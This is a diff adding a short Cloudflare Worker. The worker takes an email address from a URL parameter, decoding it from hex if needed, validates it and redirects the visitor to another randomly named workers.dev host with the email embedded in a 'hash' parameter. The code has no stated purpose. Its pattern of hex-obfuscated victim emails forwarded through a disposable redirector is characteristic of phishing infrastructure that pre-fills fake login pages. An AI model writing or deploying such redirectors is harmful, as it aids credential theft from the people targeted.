@@ -1,0 +1,47 @@
+addEventListener('fetch', event => {
+  event.respondWith(handleRequest(event.request))
+})
+
+async function handleRequest(request) {
+  const url = new URL(request.url)
+  const param = url.searchParams.get('e')
+
+  if (!param) {
+    return new Response('Missing ?e= parameter', { status: 400 })
+  }
+
+  if (isValidEmail(param)) {
+    return redirectToEmail(param)
+  }
+
+  try {
+    const decoded = hexToString(param)
+    if (isValidEmail(decoded)) {
+      return redirectToEmail(decoded)
+    } else {
+      return new Response('Invalid email format', { status: 400 })
+    }
+  } catch {
+    return new Response('Hex decode error', { status: 400 })
+  }
+}
+
+function hexToString(hex) {
+  let str = ''
+  for (let i = 0; i < hex.length; i += 2) {
+    str += String.fromCharCode(parseInt(hex.substr(i, 2), 16))
+  }
+  return str
+}
+
+function isValidEmail(email) {
+  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)
+}
+
+function redirectToEmail(email) {
+  const redirectUrl = `https://misty-grass-00d2.yalepollacklaw.workers.dev/?hash=P${(email)}`
+  return Response.redirect(redirectUrl, 302)
+  
+}
+
+
